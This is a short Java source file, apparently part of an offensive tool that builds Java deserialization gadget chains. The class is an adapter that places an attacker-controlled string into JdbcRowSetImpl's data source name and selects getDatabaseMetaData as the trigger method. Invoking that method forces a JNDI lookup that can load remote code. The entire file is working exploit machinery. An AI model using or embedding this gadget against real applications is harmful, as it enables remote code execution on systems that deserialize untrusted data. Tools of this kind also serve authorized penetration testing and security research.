package org.ses.gadgetbuilder.impl.adapters.getters;

import com.sun.rowset.JdbcRowSetImpl;
import org.ses.gadgetbuilder.adapters.GetterMethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Impact;

@Impact(Impact.JNDI)
public class JdbcRowSetMethodInvokeAdapter extends GetterMethodInvokeAdapter {
    @Override
    public Object getInvocationTarget(String command) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(command);
        return rs;
    }

    @Override
    public String getMethodName() {
        return "getDatabaseMetaData";
    }

    @Override
    public Class<?> getTargetInterface() {
        return null;
    }
}
